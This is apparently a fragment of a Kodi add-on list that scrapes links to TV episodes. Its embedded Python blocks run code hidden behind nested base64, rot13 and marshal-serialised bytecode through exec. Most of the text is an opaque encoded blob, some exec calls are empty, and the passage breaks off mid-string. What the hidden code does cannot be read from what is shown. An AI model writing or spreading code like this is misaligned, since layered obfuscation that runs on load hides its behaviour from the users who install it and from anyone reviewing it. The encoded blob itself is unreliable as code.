cVdtdE9SMFV6VFVSTk5FNXRWVE5PZW1NeFRrZFZNVTVFVlhkT1ZGVXdUVlJLYVU1VWF6SmFWRTB6VGxSVk1rNVVXVEJPZW1NeVQxUmFhRTVFUlROT2FrMHpUWHBaTUZsNldtMU9lbU42VFZSVmVFMTZaekpPVkZsNFRXMUpNMDVFV1hwT2Vra3lXbXBOTkU1RVNUQlpWRlYzVGtkWk1rNXFUVE5PZWtFeFRtcE5kMDVFWjNwUFJGRTBUbXBOTUZwVVdUSk9WRmt6VFVSYWFFNUVXVEpPYWxFeFRtMVZNRnBxVlhwT2VtZDZUWHBhYUU1RVJUSk9SRmswVG5wbk1GbHFVbTFOZWtVelRXcGFhazE2U1ROTmFscHJUa1JaZWsxcVl6Vk9iVmt3V21wTk1rNXRXVE5PYWxVd1RucG5NVTVxV1hwT2Fra3lXVlJhYkU1RVNUSmFSRlYzVG1wamVrMTZWVEJOYlVrelRWUmFiRTV0U1RKTmVscHFUbXBWTWxwcVdtaE9WRmt3VDBSTmVrNXFUVEJOVkVwdFRucE5NVTFxWkdoT2VsRXhXVlJOZVU1VVRYcE5lbFY0VFcxWk0wMUVWVFZOYlZrelQwUlJNazVVYTNwUFZGRjVUa1JqTWsxcVRUUk9SMFY2VG5wWmVrNXFhM2xaYWxrelRsUkJNVTU2VlRGT2FsRXhUWHBhYTA1cVVYcE9hbHBwVG5wSk1GcFVXVEZPZWtVeFRVUk5NMDVxWTNwTlZGRTBUbXBKTWxwcVZUQk9lbU16VDBSTk0wMTZZekJQVkZVMFRtMVpNazFxVFROTmJVbDZUMFJTYVU1NlVUSk9WRTE0VFhwRmVrMTZUWGxPZWtFeFRucFZNazV0VVhwT2FscHNUbnBSZWs5VVl6Sk9SMUV5V1ZSS2FVNXFZM2xhYWxKcVRtMVpNazVVVW0xT1JHY3pUMFJOZWs1dFVUTlBWRkY2VFhwTk1VNTZVVEpOZW1NeVRtcFZNMDV6dnhNQUFHMTRNVUZ0UlhoQmQzaHNUSGRFYTBGUlJHeE5kMDE2UVcxV2JFMTNTREJCVVhBeVduZGFNMEZSUkRCTWJVMTNRWGR3TWtGSFRYZEJSM2d5UWxGTmVWcHRWakphUjBWNFdtMTRNVUZIU0ROQmQzUXhRbEZhTWxwdFNEQk5kMHd6V20xd2JWcEhUWHBCUjBReldrZFhka0Z0V20xYWQwVjZRVzFJYlZwUlNYVmFiWFF5VFVkd01WcHRSRE5CZDBodFFYZElNRnB0U0RCQmJYUXhRVzFGZDBGM1JEQkJVVWcwV20xU2JWcFJjREphYlhnd1RIZHhkVUZ0ZERGQ1IwZzBRVkY0TVVGdFJERkJSMDR4UVcxRU5FRjNkREZNUjFvd1FYZE1NMXB0Y0ROQlZFZ3lUVWRFTWtGdFNEQk1kMGhyV20xTU1WcFJjREphYlVnelFYZHdORUZIVGpCTVIxbzFRWHBFTTBGSFREQmFiWEF6UVhkTmQwRjZTREpCYlUxMVFWUklNRUpIVERSQmJYUnRRWGRYZWxwdFdqSk1kMXByUVRKU01rSkhXalJCU2xKdFdtMUVNa0ZIZERCQmQwUTFXbTE0TVZwUldqSkJkM1F5UWtkSU1scHRSREpCZDFwdFFUSlNNbHB0U0RCQlNsSXpRVkZNTkVGM2REQmFkMHcwUVhwYWJWcEhSWGRhYlVSc1RYZGFNVUY2VERKYVIxbzBXbTFTTTFwM1RYcEJiVlp0UWtkTU5VRlJlREJOUjB3MVFVcFNNa0pIUlhkQmQwZ3pURWRJTWtGNlNEQmFSMFYxUVZGU2JVRnRSWFZCZWtReFFrZElORUV5VWpCYVIzQXhRVWQ0TUVKSFdqQkJiVm93UVVkeGRWcHRSREpOZDNBd1dtMUlNVnAzV20xQmJYQnRRVzF3TUVGUmREQk1kM0F5UVcxTU1WcDNSWHBCZDB3eVRVZEVORUZSVmpKQlIwMTVRVEpTTWtGdGNHdGFiVWd5UVcxTmRVRlVSREJCYlV3MFFYcE1iRTEzUkRCQmQwd3lUSGRhTlVGM1dqRkJiVm95UVhkV00weEhXalJCZWxZeFFWRndNa0Z0V2pKQlIxbzBXbTEwTVVGdFJEUmFiWFF6V2xGRU1rRjZWbTFhYlhBMFFWRjBiVnAzUlhWQlIxb3pRbEZhTTBGSFRESmFSMDExUVhkNE1FRjNjRE5CUjNBeVRHMU5la0ZIVGpKTVIwMTRXbnBNTTBGUlREQkJVWFF4UVhkSU1WcHRWbXhOZDBSdFFYZFNNRUZSVjNwQmQxWXlUWGRFTUZwdFVqSkJSMHhyUVcxME1FRkhjREpCZWt4c1RYZHdNa0ZIV214TWQwZ3dRVzEwTTBGUlJHdEJiVlp0UWxGd01FRlJkREphYlZvMFdtMTRNVUpSV2pKQlIwNXRRVkZhTTBGUmRETmFVVVY2UVZGTU1VSkhXakZCZWtRd1RFZEliVUZVVEROQ1VYQXhRVWR3YlZwUlREQkJNbEl3VEcxSU1FRjNWakphYlhBMVFXMU1NVUYzU0ROYWJWb3pRVWRFYTBGSGNETkNVVTE1UVhwRU0wSkhXakphYlZac1RYZElhbHA2VEROQmQxZDJRVzFNTWxwM1dqRkJkM2d6UWxGTmVFRnRlRzFhYlZvelFVZGFNMEZSVFhoYWJWb3dXbTFNTUVGM2RERkJkMFExV20xTU0xcEhjRFJCUjFveFFYZEVOVUZVVERCTlVWZDJRWHBNTWsxM1YzWkJlbEl5UWtad1FWQjZaM2x5U2pGMWJqSkpiRlpSTUhSWE1VRm5SVEZYVVVGS09UTkVSM2xoU2tneFlrZFJVbTFGZDNsRWIzZHdaVUZIVjNkdVJtZEhURW94YmtZeGRXTnZZVTFKUldGeGQwbFNkVFpHTWtsVFdqQkZOWEpMVDI1d2VGTlljbmhUYlZvd1VtVnVWR2RpUWxRMWFXNVJjV1JDVkVFMFNWVkZSVzVIU1ZwS1NWTkVXVE5CTUZnemRXWkpNakZYUkRCNU1XOTJabWxNWVdOQlJVZGFiSEJWVFc1SVIzUTFja2hCUVVsM1FXMUZWR3N4UmtkRmFrWjZPV0ZhWVVGbldUSlRhVzh5ZVdGTlNuVm9URWhCUmtReVJXMWFNRUV6YjJGSlpFWjVWMU5hTVZOcVNrbzRaVVF6VTAxSlZGTTJjRE5KWVVreU9HMXdTa0ZCU0cxSU0zRjRaMDF2YlZOdGIyRlBXRm94WTFGTmRqbGpUWGg1ZW01SWRXRndTa0ZuY0hsSlJYQXlUVzVIU21OTlRIWm5lRWhLT0RGd1IwRklRWGhyVFc5U1VtMU5kbWRtU2twamJWcFJkVkZHZVdOSVNraHJUWEZSVDFoTU1rZzFRa2xqWlc5SU5XdE1NVUYxY2xCbllrbDVWMlJGTUZJMFIwcEVNbTU1Y1ZGTlZHdHBSakJGWjNGR1owVktVbWRVUmpKU2FrRklaakZ2U1dKbFJIcGpaSEF5TVdGTlNWZExUVXAxV2sxVVNHdE5Na2xQUmtoTlpVSlVabXhDU1ZKdGJqTlBlVXBLWjNsQ1ZFUTFXa3RQTlVwSGRXZHlTSEZHY0ZSWFNtNVVTVVJNZWpRelNrZEJVRVV6ZEdWeGVtc3pibUZCV1c5NVNEUkJVa1F6U0ROUFVVeHRWalJDUjBWSldETlNaVUpLTURKWk1VRXhjbm81ZG01TGNWZHlTM1V6VEVsQlVYQlVlRFJhVTA1cGIwaG5lbTlLZVVKRmJWcHRRVWRGVDI4eWNVdEZSM1Z0Y1hwclFVd3lhekpIZDBWalJUTjVRMWh0U1VWdk0wUXhSekJqYlVneFJYZEdNbXBsV20xTmQwRjRXalZhUzFNeFJIWTVUM0pKVnpCd1UzbFpRVE5KUTFwVFdqTndTWGw1YjNoNU0wbHRUelpLZVV3eVdHMWFNVUV6ZVZSTk1rRk5USGROTWtKU2VXbE5NazFsUWtoVFVFa3dWakZhYlU5clFraGFhMEpTY1dGdWQzbFhibmQxV205SmRXaEhkMGxIVEhoclprVXpZMlZaTTA0MVJ6Skpia2gzU1ZoSFVuQTFjR0ZGTmtaVFdtMUNTRTFOYjNobWFrVktlR3hJTTFKcFJFdEpVVWN5TVRWdlIwVXpRbFJ4UjBwNlV6SktTa0ZKUmtoNE0xcDVjVFpHUzJKbFFVaDFXVnBRWm10dlUzRmpTRXAwYWtaSVYzVmFkM2xEVFhoV01VRmhVMVZIU1VWYWJ6RmpOWEJSVFRWSlZVRnFiMGhYV2sxU2NHeEtkMDFQVEROVFdYQjZRVzFhU0VreGJ6STBORUZIZFVseE1VMTVXRE5QUkhGNlVtMWFlakZrUVVkQlFYQlVTV3B3TVZZeVFYbGpVa3hoUVRKdU1rZzBSVkpXWlVwaFQySmFNa3h0Y2twMVJVcFZWM2xOTW1ZMVNGRk5RVmd3Wm1wd2VHdEpjREJCUzBVd1kwZE5lVk5JUm1GQlpIRXpXak54ZVVWaFJubzRNVUZLY0ROd1lWTXhiM2hTYlhKM1dtMXVTazFSY0hkWGRVZ3plV0pOZUZOMVFYbFdhVUpKZVV0TlNsWTFiMG93TWxveWFqQnZiWGd4Y2t0TlEyOVVaMFJIVWt4dFNHRlBTMjVLWm10SVVVeHNiako0TUhBelVtVndlVTlqV1RKQk5rSkxkV2hKZWxJd1dURlRUSEpUWW0xRVNsZEJSRE5qZGtsSVFYZEhSamwxYmtvNVdYQmhlR1ZKTW1vemNIb3hSMWt6VTNWd2JYRldXVEJYVkVkTFRVRmFNSGxaVFd3NVIyOHhlVmR2TW5RelJ6SkVNRmt3UlVwWWJVMVRiblptTTBneWNXaEJVMGd3UVZWSmVrbFNSVTl3ZUVFemNGSkJXVVozZFdkdmQwUXpXakppTTBwTGRXNU5SM0ZoV2toNVNVaElZMWhLZW5Cc2NsSkZNVzU0WW10Q1VtZG1TbmhuYTBKUmVESkZZWFZZV0RBeFNIQjNVMWh1TUVGRmNuaG5WMEY2ZFdWdlNEVXlRVWh3TUVkNVJXdEpVblF5U2xWNVdtOUtabTFGZUVFeVRFdDFkVVpTZVd4WmJYUXdjbUZQVTBwUlNHdE5SMWRJYjBoalkzRXlNVU5hWVhsalFXRnhXa2RMUVV4d2RtZGpibmhOYlhGdGRXdGFkMU5CVFhkQmRYRkhjR3RLU0dkbGNsSmpia2xWVjI1TlMxZHVRVkZ4VUV3d1owUllNa0ZLVFhvMVJrbFRWalZIU0RFd1dubDVXVXA2VjNoTlVVVnFXakphTTBKVmNVbHVkamwzYjB0QmQxcDZNVWRFTWxkNGIydzRhWEZTTkcxRWVYVTFSekI1VVhKNk1UWnZSamxaY0dGSmVWcGhlVmxJVlhWTFdtMUJXRzVSZVhWTlNuVnBia3RUZDI5NllqTkVNRVZyY0hsUFUweEdaalJOU2tGQ1FXMU1OVWRUZVVWeWVYUXdjbUYxYm05NlNVWkZSbWRWY0VoNVIwbFZlVmRDU0V3d1RVaEJXRUpHT1c1eVNtTnJjVWhyZVZrd1JWQndWVTFuUjBoU01FSkxUVWxhTWxkaFdsVjFiRVI1Y1ZaYVZERkdTbnBXWlZreFkyWnhNbmxoUm5wcmVFUXdjV05DU0Vsc2NGSTBhVWhHT1hWQlNEVlpTa294TkhGUmNVeHVTR0kxU1ZSSlYwWXpSVkJHUmpsdFNFWm5aM0ZHT1daeVZVRXpTa2xTYTFwdFNXcEdSbVpzY0VvNVlVcDRSR2x1VTNWWlNURlNNMFoyT1ZkRU0zVXpXak5CV0c1U2FtcEdlVTE1V2pCWFdVeEhSR3BNTW5VeVFYaEJiVTFWVDI1YVMzRkJjREJuVTBRelltMXZVWEZyUVVwMGJFeDJPWFZhVVZOQlNrcEZTMDF0VTBGeFZHZGlTblk1ZFV4NGNWbENVbU5KY1VsT01VWXlPRE5hU0ZNeldEQkJTa0pKUVdGTVlYRldXVEZ4ZVZwVWEwTkpTakZTY2t0SlQzSkxVMnR2VTNWb2IwbElhazFKUkdWdlNqUTBSekJyTmxwdFNVaElTREJzU25ZNWJVSkhVbWx5VWxOdFdqSnhVVnB0ZERKRVNVbFpRa3RCU2sxdGRHbEdNbVl5Y0RONVkxcFVRV1J1U2tGRFJqQjRNazFIUVVKTlNsTjRUVEp4YlVWVmVXSndVMW8wU1VkWFkwUXhUMGh5U210cFRWTjRiRTFSVTFCR01ua3pXVEo0TUZneWEwbE5NR05QUVV0QmFsb3laakp1U0dkVGJubEJZMDB5U1RadlVWTnJRVzFGYVVZd01YcE5iVTFCYm1GMVRFUkxWMGxOU2sxU1dsQTVURWRLUVdWd01sTXlXa3BTYTAxNlNUWklTRUZpVFVvMVpra3pRV1JOTUdkWWNGUkZabGd6U1dOQ1NqVTJSakI0YVc1U1UzVnVNVk5QUm5kWFJrbDVZbWx2VVhWblFrcEpRMXA2U1V4Wk1tc3lia2xQVmtsVVJYVkhNMEZSV2twNVQwcDRkVEZJTTJOaGJrZHhORzVoVFc1d2VrbEhTRk5KWTBoVFFXZEpNVk16Y1VsSlZtOVZZbTFJZWxkV1NYcHhkVXhoU1dOTlVYRlJTa3B3YW5GNlkyMXhkM2xuYjFJd00wRlJRVEJLZW5GalNHMTVRa0pMVjJWSlUzVXdRVlZUVmtsSFRUQnhVMGhsY0RJNE0wRkhjVU5hZW5sQmJubFRVMEV6V2pWSlMyTnBSbmhOUmtsUmVEUmFSM0YzU25neFYxZ3pZMGhLU25WR1NYZDVNMFl4UlcxYVJqbGpSV0ZYVFVGNFVqUk5lbVpyYjNwRldXNVVjREp3ZUVGQ1FrZ3hXbGd3ZVVOdU1IQnRRVlF3TWtsS2NVdEpWVVZOV2pCcmFscHRjVEZ3TWpFeldUQm1NMFZTVTBseVVEbFVUVWROYlVKVU9HeFlNa2hsV1cxMVkyNUtlVWx3ZWxkWlFUQXhka0Z0Y1dadlUzazJjSHA1YWt4SWNHMU5VRGxzYmtoVFkxcHRTVTl3ZUhSbGJrZFRZa3AyWmpOQ1MxZEhRVXAxVlVFeWRHcEVlWFZJUlZWQk5uRjNTV3hOU1ZkSmIwaEZlbTlWVFZaQmRtZFNjSGhCYTB4M2NHMVlNMDlVUlcxMVFVUXpZbWxCTTBobFJFWTVZVWhKZURGRVlWZFNia2x4ZGsxU01EUnZVbE5qYjB0V2EzRXlhMjVaTVVneFJtMTFNMEZ0ZEdWR2JVMHlUREl4VkVSc09XMVpNRFF3UVd3NVZYRXdXbVZGVkdvMFRVaFRVVnBoY1haQ1NtZHRXa2gwWlVGSmNETkJWSFZ0UkRGVFFXOTVlR1ZJZGpocmNrcE1hWEJoVjNsdVVEZ3lUREZKVlVac1oyWmFVWEZUY0hwclozRXpRVmxaTWtWUlFVZDFZWEo2Tlc1d2JVUTFjRE5qZDFreU9UVkpVVTFZUWtwWE1rSkpValJ2VWpGUVducHhhVzh5Y1dOWU1uaHJXbTE1YTFsdFYxbEtSamxsUVcxQk5tOTZPVXROTUdOSWNsVlhNVXh0ZFdaR01Ya3dXRE53YVVKVldqVndZVVZhYjBkSlQwUnRRWGx1VkRsQlIwbzVXVXg0T1hod2VIUTFiM2R3YlVkS2NVeE1NVWd6Um1GeFEwa3laMnBFYlhWdVJrZFhTa1ZVVTIxS2VHTnJUVk5YWlc1SVoxQkpSMGh0V0cxWFpIQjRSVWxHWVhBeldrZFhVMFV3UVdaWmJVaHJSbTFUYTFwTFltVkJlWGhzUWt0d05FRkdPREZGZVVsaFJUSkZVVXg0UlZsdVNVbFJXR3huTlhCSFQyZEVlRm94Y0V0aldGcHNPVTF3YkdkalFYcHFhVUpJUkdWdVNuVnVRV3htYTAweVRUWndNM0ZCY0hobU1FSlJRV05JUjFKbFNVdE1NVmt5WTNkS1UwbEpXa2Q1VFUxNFFWUlpNVk5SYjBkNVJXOXRkREZaTW5WcFJHdzVOVTB5ZVVodmJEaHBXREk1YlZsc09XNXdTbXRzV2twSVpVcDVjV0pHZDNWWFFWUjVVRmx0Y1hsTmQxbzFjSGhxYlZwNk9WQkVTVk5xUkRCWFMxb3lVMHhCYlUxSWIzZEpXRzU0WW0xdWQzaGxTVXBJYVhCNmRHcHVNbE41UWxGU01scDJPV0pKU21Oa2JrZHhXa3g0VFZGQmJEbEVXak5QVVVwSFVqVklVbHB0UVZSQlpVUXlhM1ZIUjNscFNIZEJiVmd3VTJaYVIzaHBXbEpKWkVaVWNETk1kMGxaUVZGSWFYSjZlREpOUmpsSldHMTVVVXA2Wm1WSlNFRTJjRzFKV1ZsdFRXWndSamxsY1hkRmJVWnRXbWxaYlhReFFXdzRORmt5U0dsWk1qRmpXRE5YVUhCdFYyMWFiRGhwYjFCbU0waDJPVWRNUzNCc1dtMTVZa2hTUVZsQlVUQmhVVVJqTm01S09XaFdVVEIwVnpGck5FRnRWM0J5VVUxNlMxVjBNMEZUYXpSYWJWTndjbEZhYlZkcU1GaHZla2xwVmxFd2RFMUxUWFZ2VUhSaFMxVjBNbHA1YXpSQmQzbHdjbEZOZVV0VmRESmFTV3MwUVcxQmNISlJURzFMVlhReVFrbHJORUYzZVhCeVVWZDVTMVYwTTBGSmF6UkJla2x3Y2xGTU5FdFZkREpCU1dzMFFXMTFjSEpSVFhkTFZYUXlRa2xyTkVGM1RYQnlVWEExUzFWMGJFSlRhelJCZWtWd2NsRk5la3RWZEROYWVXczBRVzFQY0hKUlREUkxWWFF5UVVsck5FRnRTWEJ5VVhCdFMxVjBiRUpKYXpSYWQwNWhXRVpPWlZaVVNUSk1TbXBpVnpGck5FRjNRWEJ5VVUxNlMxVjBNa0ZUYXpSQmQwbHdjbEZNYlV0VmRETmFNV3MwV25wSmNISlJUREJMVlhReVFVbHJORUYzUVhCeVVVMTZTMVYwTWtGVGF6UkJkMGx3Y2xGV05FdFZkRE5CVTJzMFFXMVhjSEpSVERWTFZYUXlUVWxyTkVGM2VYQnlVWEF3UzFWME0wSkphelJhZWtGd2NsRldha3RWZEROTVNXczBRWGQ1Y0hKUlRYcExWWFF5VFVsck5GcDNlR0ZZUms1bFZsUkpNa3hLYW1KWE1XczBRWGRYY0hKUlREVkxWWFF5VFVsck5FRjNVM0J5VVhCdFMxVjBNbG94YXpSQmQzbHdjbEZNTlV0VmRHeE5TV3MwUVcxSmNISlJUWGxMVlhReVFsTnJORUYzU1hCeVVYQTBTMVYwTWt3eGF6UkJkM2x3Y2xGTU1rdFZkRE5DU1dzMFduZDFjSEpSVFhwTFZYUXpXbmxyTkVGM1UzQnlVVXh0UzFWME1rd3hhelJCZDBsd2NsRldOVmRzZUhSWWJFOTVjWHBUWmxoUWNYQnlVVXh0UzFWME1rMTVhelJCZDBWd2NsRk1NVXRWZERKYU1XczBRVzFCY0hKUlYzbExWWFF5UVZOck5FRjNTWEJ5VVV4dFMxVjBNazE1YXpSQmQwVndjbEZNTVV0VmRHeENVMnMwUVhwWGNISlJUREZMVlhRelFrbHJORUY2UlhCeVVVeHJTMVYwTWt4NWF6UkJkMGx3Y2xGd2JFdFZkR3hhVTJzMFducEJjSEpSVm1wTFZYUXpURWxyTkVGM2VYQnlVVTE2UzFWME1rMUphelJhZDNoaFdFUXdXRTFMVFhWdlVIVjNiekl4YW01S2EzbFlWV05tYmtwV2FFMVVTWGR2TWpGcWNIcEpiWEJzZFhaTVMwRjVRWGRFYUV4M1REQk5WRWwzYnpKRmVWaFVTVEpNU21waVZ6RnJORUY2U1hCeVVVd3hTMVYwTWsxMmNHTllSbmhtVjIxcmJYRlZWMk52ZW5BclYyeHFZVTFMZFhsTWJIQmpXRVE5UFhRRkFBQUFjbTkwTVROekNRQUFBRzF2Y25Cb1pYVnpJSE1jQUFBQVkyOWtaV056TG1SbFkyOWtaU2gwY21sdWFYUjVMQ0I2YVc5dUtYUUdBQUFBYjNKaFkyeGxjeDRBQUFCamIyUmxZM011WkdWamIyUmxLR3RsZVcxaGEyVnlJQ3dnZW1sdmJpbDBBd0FBQUc1bGIzTUlBQUFBUEhOMGNtbHVaejUwQkFBQUFHVjRaV01vQ3dBQUFIUUdBQUFBWW1GelpUWTBkQVlBQUFCamIyUmxZM04wQ0FBQUFHMXZjbkJvWlhWemRBY0FBQUIwY21sdWFYUjVVZ1FBQUFCMENBQUFBR3RsZVcxaGEyVnlkQVFBQUFCNmFXOXVkQVFBQUFCbGRtRnNVZ1VBQUFCMEJ3QUFBR052YlhCcGJHVjBDUUFBQUdJMk5HUmxZMjlrWlNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6RGdBQUFCZ0JCZ0VHQVFZQkJnRUdBU29CIikpKQ=="))

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MEN4a0FBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGTmVtc3lXWHBqTVUxNldYcE5SRmsxVFhwSmVrNVVWVFJPZWswd1RYcEthVTVVUlhwUFJGSm9UWHBOTUU5VVdURk9lazB6VG5wWk5VMTZRWHBOUkZKdFRrUlZNazlVU21sT1ZFbDZUVVJSZVU1VVp6Qk5WRTAxVGxSRk1rOUVZelJPVkZVd1RsUlNhMDU2YXpGTmFtTTBUbTFKTWxwRVZURk9WRTE2VDFSak5VNUVVVE5QVkdNMVRrZE5NRTVVWTNoT2JVa3hUWHBTYUU1cVVUSlplbEV3VG0xTmVrOVVTbTFOZWtWNlQxUmpkMDE2UVRKYVZGazBUbnBCTTA1NlRYZE9hbFV5VDFSUk5FNVVTVE5PVkZFelRsUlZNRmw2VVRCT1JGVXhUMVJqZWs1VVl6QmFSRlYzVG1wRmVWbHFTbTFPVkdzd1dXcEtiVTVFYTNsYWFsa3lUbTFGTTA1cVZUTk9lbWN5VGxSTmVrNUVaM3BQUkZsNlRtcFJNMDVxVW1wTmVtY3dXbXBqTWs1NldYbGFhbVJvVGtSbk1rMXFUVEpPZWxreFRsUktiVTVxV1RGT2VsVTBUbFJuZWsxNlRUUk5lbFV4VG1wTk5FMTZUVE5PUkVwdFRtcFZNRnBxVFhwT2JVMTZUMFJWZDA1cVdUSlpWR016VFcxSk0xbFVZekpOYlZreldWUlJNMDVFVlRKTmVsVTBUbXBaTWs1cVNtMU5la2t5V1hwak1VNTZTWHBOUkUxNlRtcEplazlFV1RKTmVtTjZUWHBOZWsxdFdYcE9lazB5VFhwSmVWbHFTbTFOYlVsNlQwUlZkMDU2YTNsWmFscHFUa2RGTTA1RVZYZE9iVlV4VFVSTmVrMTZXVEpPVkZKcFRYcGpNMDU2V1RCT2Vtc3dXbXBaZVU1NlJURlBSR015VFhwVk1GbDZZekZOZWxGNlRVUk5OVTVYUlhwTmFrMTRUa1JSTVUxVVl6Sk9Na1Y2VDBSak1rNVVRVEphYWxwdFRYcFZNRnBxVlROT2Fra3hUbFJaZUUxNlp6TlpWRlV3VGxSUk0wNTZZekZOYlZrd1dYcFpORTU2WnpKT2FrMTZUbXBWTTAxNlZtaE9iVlY1V1dwVk0wNUhUVEJPVkUxNFRYcG5NMDlFVlRGT2FsbDZUMFJaTUUxNll6TlpWRlY0VG5wVk1rNVVWbWhOZW1jeVRWUk5lRTU2WXpGT1JHTjZUbXBaTUZsNlRYbE9ha2t4VFZSUk5FNXFVVE5PZWxwc1RucFpNVTFxV1RWT2VrMHlUMFJaTWsxdFNYcFBWRkpyVGtSUk1WbFVZM2ROYlZrd1dYcFZOVTVYUlRCWmVrcHBUbXBKTUU1NlRYcE9la0V5V2tSWmVVNUhVVEpOZWxKb1RtMVZNbHBxV1hoT2VrMHpUMFJSTTA1NlFURk9lbGt3VGpKRk1VNUVXVEZPZWtFd1drUmFhRTVxU1RKWmVtUm9UbTFOTVUxNlZUSk9ha2w2VFdwa2FFNUVZekphYWxFeVRrZEZNbGxVWTNkT2JWRXdUbXBTYTA1dFJYcFBWRTAwVGtkUk1sbDZWVE5PYWtreVdrUldhRTU2VlhsWmFsVTFUbFJqTWsxNlkzZE5lazB3VDFSYWFVMTZTVEZPYWsxNVRsUkpNMWxVV21oT2FsRXdXVlJWTVU1VVkzcE5lbGw2VGxkRmVrMXFXVEJPUjFFelRucGthRTVxU1RKWmVtTTFUbTFOTWsxcVRUVk9SR3N3VDFSS2JVNTZZekphYW1Nd1RrZEplazE2V1RKT2FrVXpUMFJqZVUxNlVURlBWRmt4VGxSck1scFVXbXhPUkZreFQwUk5NazR5UlRCYVJFMTVUbFJCTWxsVVVtMU9iVTB6VFZSVk0wMTZZek5OYW1ONVRrZFZNazFVVVROT2JWRXlUV3BWZDAxNlRYcE9SR015VG0xVmVrOVVUVE5OZWxFd1QwUlZNMDU2VVRKUFJGa3lUbFJKZVZwcVkzbE9WR3N3V1ZSTk1VNTZaekJhVkUxNVRYcFJlazVVVlhkT2Vra3hUbXBSTTA1NlNUQlphbEpzVG5wWk1GbHFXbXhOZW1zeFRsUlZOVTE2UlROUFJHTXhUa1JyTUUxVVZYZE9WR042VFZSa2FFNVVhek5OUkUxNFRucE5NRnBVVFRCT1IxVXlUbXBTYUUxdFdUTk9WRXB0VG0xVk1FNTZZelJPYlZVd1drUk5NMDU2V1RKYVJGRTFUa2RWTUZsNldYbE9hbGt6V1ZSak1FMTZVWHBOUkZsNVRtMVJNazVFWTNwT1ZGVjZUa1JOTkU1NlZUQlplbHB0VGxSak1VMVVXWHBOZW10NlRucFpNazVFVVRCT2VtTjZUbnBKTUU5VVZURk5la2t4VG5wamVFNTZUVEpOZWxGNlRXMVpNRTlFVFhsTmVtc3pUVlJWZDA1SFdUSlplbGw1VGtkWk0wOVVTbWxPZW1jd1dYcEthVTU2WTNwT2VtTjRUa2RKTUUxNlZUUk9hazB4V1ZSVmQwNTZWVEZaVkdOM1RucFJNMDFVVW14TmVrbDZUbFJqZWs1SFZUSk9WRmt5VG5wWk1FMTZXbXhPZWtreFQxUlZNVTVFYXpGUFZHTTFUbFJCZWsxVVVtMU9SMWt6V1ZSVk1rNXRSWHBOUkUxNVRsUkJNazVVVlhoT2FrMTZUWHBqTkU1NlJUSmFSRmw0VG5wSk1FNVVVbTFPYW1zeFRVUk5lVTVVUVRGTmVtTjRUa2RWTWsxNlkzaE9lbFV4VGxSTk1FMTZWVEZPZWsweFRrZEpNVTVFV21wTmJWa3lUbnBaZWsxNlp6QmFSRmw2VFhwQk1FNUVXVEpPVkd0NlRYcFJNRTVxVlRGT1ZGRTBUbXBWTWxsNlZYcE9SR042VFZSamVrNTZSVEpPVkUwMVRucG5NMDFFVFhsT1ZHZDZUa1JqTUU1dFNUSlplbFYzVFcxSk1FOUVUVFJOZW1jeVQwUmpORTE2WXpOT2Vsa3lUbXBOZWs1VVRYcE9hazB5V1ZSamVrNXFTWHBQUkZFd1RucFpNVTU2V1ROT2Fra3pUbnBWTWsxNlZUTlBWRmswVGtSak1rNXFVbTFPUjAxNlQxUktiVTVFUlRKYWFsWm9Ua1JyTUU1VVNtMU9SRWw2VFhwTk1rNUVWVEZOUkUxNFRsUmpNRTVVV1hwTmVtc3dXV3BOZUU1dFVUTk9SRkpvVG5wTk1rMVVUVFJPYWtrelQxUmFhVTU2V1ROTlZGSnJUbFJKTWxwVVRUVk9SRVV5VDBSTmVrMXRXVEZPYWxKc1RsUmpNazFxWXpGT1JFMHlXVlJSTkU1cVl6Qk9lbHBzVG1wVk1FNUVUWHBOZWsweFQxUlJNRTE2UlRKYWFsRXlUVzFKTUU1cVpHaE9lbU15VDBSTk1rNXFhek5QVkdNeVRsUnJNazU2VFROTmJWa3hUVVJLYVU1RVNUTlpWRTE1VG1wbk1rNTZTbWxPYWswd1drUlJNVTE2YTNsWmFsazBUbGRGZWs1cVRYZE9WRTB5VGxSS2FVNVhSVE5OZWxVeFRYcEZl